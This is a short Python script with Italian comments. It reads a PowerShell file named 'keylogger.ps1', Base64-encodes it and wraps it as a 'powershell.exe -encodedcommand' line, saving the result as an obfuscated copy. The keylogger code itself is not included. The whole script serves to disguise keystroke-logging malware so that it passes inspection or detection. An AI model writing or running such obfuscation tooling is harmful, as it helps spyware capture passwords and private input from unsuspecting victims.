import base64

# Percorso del file PowerShell
input_file = "keylogger.ps1"
output_file = "keylogger_obfuscated.ps1"

# Leggi il contenuto del file
with open(input_file, "r") as f:
    content = f.read()

# Codifica in Base64
encoded_content = base64.b64encode(content.encode('utf-16le')).decode()

# Crea il comando PowerShell offuscato
obfuscated_script = f'powershell.exe -encodedcommand {encoded_content}'

# Salva lo script offuscato
with open(output_file, "w") as f:
    f.write(obfuscated_script)

print(f"Script offuscato salvato in: {output_file}")
